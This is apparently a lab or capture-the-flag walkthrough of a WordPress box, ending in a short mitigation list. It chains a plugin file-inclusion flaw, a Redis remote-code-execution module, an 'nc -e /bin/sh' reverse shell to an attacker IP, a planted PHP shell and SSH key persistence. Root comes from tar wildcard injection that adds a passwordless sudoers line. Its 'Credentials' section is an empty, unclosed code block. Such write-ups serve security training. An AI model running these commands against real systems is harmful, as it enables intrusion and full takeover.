192.168.219.166

## Introduction

In this guide, I exploited a **Local File Inclusion (LFI)** vulnerability in a vulnerable **WordPress plugin** to interact with a locally running **Redis service**. By chaining the LFI with access to Redis, I was able to **poison Redis keys**, ultimately achieving a **web shell** and gaining a foothold on the system.

Once inside, I discovered a **cron job** running a **backup script** that interacted with file names in a wildcard-expanding context. I crafted a **wildcard injection payload** (e.g., `--checkpoint-action=exec=sh root.sh`) and placed it strategically so that the cron job executed it. This resulted in **privilege escalation to root**.

## Nmap

### TCP

Run a quick Nmap TCP scan:

```bash
sudo nmap -sV $IP --open
```

### UDP

Check top 100 UDP ports:

```bash
sudo nmap -sU -F $IP
```

### Full Port Scan

```bash
sudo nmap -sV -sC -p- $IP -Pn -n -v --open
```

## Services

### Port 22

Version - OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)

We usually skip SSH.

### Port 6379 (Redis)

```bash
redis-cli -h $IP
```

it returns that requires pass, I am gonna try to read the redis password using local file inclusion we already have (`See Port 80`) `/etc/redis/redis.conf`.

![image.png](image%202.png)

```bash
redis-cli -h $IP -a Ready4Redis?
```

After logging in and running `info` command I see the redis version is 5.0.14:

After a little bit of enumeration of redis I discovered that it has vulnerabilty:
[Redis RCE](https://github.com/Ridter/redis-rce.git)

Build a module using this:

[https://github.com/n0b0dyCN/RedisModules-ExecuteCommand](https://github.com/n0b0dyCN/RedisModules-ExecuteCommand)

## Web

### Port 80

Version - Apache httpd 2.4.38 ((Debian))

Visiting the site we site that it is a Wordpress site:

![image.png](image%204.png)

From the source code I see its version is `5.7.2` :

![image.png](image%205.png)

**Gobuster Scan**

![image.png](image%206.png)

WPScan

```bash
sudo wpscan -e ap -t 500 --url http://192.168.219.166/
```

- Upload directory has listing enabled: `http://192.168.219.166/wp-content/uploads/`

Themes:

`twentytwentyone 1.3`

No public exploits found.

Plugins:

`site-editor 1.1.1`

I have found the following exploit for this version of plugin:
https://www.exploit-db.com/exploits/44340

```bash
http://192.168.219.166/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd
```

## Exploitation

Running the exploit we can gain access as redis user:

```bash
python3 redis-rce.py -r 192.168.219.166 -L 192.168.45.227 -P 80 -f ../module.so -a Ready4Redis?
```

![image.png](image%208.png)

Let’s get a reverse shell now.

![image.png](image%209.png)

```bash
nc -e /bin/sh 192.168.45.227 80
```

![image.png](image%2010.png)

Now we have a shell.

Let’s make it interactive using python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## Lateral Movement

I see just `.rdb` file in my home directory as redis user I am gonna transfer it to my machine and try to parse it as json.

![image.png](image%2011.png)

I downloaded this utility to read `dump.rdb`:

[https://github.com/HDT3213/rdb](https://github.com/HDT3213/rdb)

But I couldn’t find anything interesting.

Then I read `wp-config.php` from wordpress root directory and there I saw credentials for mysql database user:

![image.png](image%2012.png)

I found there admin hash but couldn’t crack it.

I checked nearly everything now I am gonna check running processes with `pspy64`.

```bash
timeout 3m ./pspy64
```

But we cannot do that. Then let’s do that manually with 

```bash
ps aux
```

I see just apache is run by `alice`.

If we have write access and LFI vulnerability, we can write executable file and include it from browser in that case file will be executed in the context of the user running server.

I am gonna write a reverse php shell and include it from browser.

I first put it in `tmp` it failed. Then I put in `tmp` a hello.txt file and tried to include but it still failed that means the problem is related to `/tmp` directory, I am gonna put php file in `/var/lib/redis` it still failed.

Then searching for writable directories I found it shows me `hello world` message from `/dev/shm` directory

```bash
find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
```

![image.png](image%2013.png)

Let’s now put here `shell.php`.

It hanged;

![image.png](image%2014.png)

And we got a shell as Alice.

![image.png](image%2015.png)

## Privilege Escalation

```bash
cat /etc/ssh/sshd_config | grep PubkeyAuthentication
```

![image.png](image%2016.png)

To make my access persistent I am gonna put `ssh` credentials in home directory of alice.

```bash
ssh-keygen -t rsa
```

![image.png](image%2017.png)

```bash
ssh alice@$IP -i alice
```

There is a cron job run as root

![image.png](image%2019.png)

We don’t have write access to it.

```bash
#!/bin/bash                                                                                                                                                                                                                                 
                                                                                                                                                                                                                                            
cd /var/www/html                                                                                                                                                                                                                            
if [ $(find . -type f -mmin -3 | wc -l) -gt 0 ]; then                                                                                                                                                                                       
tar -cf /opt/backups/website.tar *                                                                                                                                                                                                          
fi 
```

This file goes to `/var/www/html` directory, checks for files if file modified no later that 3 minutes ago, and number of its lines is greater than 0 then it performs backup in `/opt/backups` folder.

We can perform [wildcard abuse](https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/) of tar utility in this file. Go to the folder where cron job is running tar command and put there the following commands:

```bash
echo 'echo "alice ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
echo "" > "--checkpoint-action=exec=sh root.sh"
echo "" > --checkpoint=1
```

Now we need to wait until cron job is executed.

After it is executed we get the root shell:

## Credentials

```bash

## Mitigation

- **Fix LFI Vulnerabilities:** Sanitize file path inputs and avoid passing unsanitized data to file functions.
- **Harden Redis:** Bind Redis to localhost only, require authentication, and disable dangerous commands in production.
- **Secure Cron Jobs:** Avoid using wildcards in cron scripts, or sanitize input to prevent wildcard injection attacks.
- **Limit File Permissions:** Prevent write access to sensitive cron directories for low-privileged users.
- **Use AppArmor/SELinux:** Implement mandatory access controls to restrict what processes can execute and access.
- **Keep Software Updated:** Regularly patch plugins, CMS, and services like Redis to close known security holes.
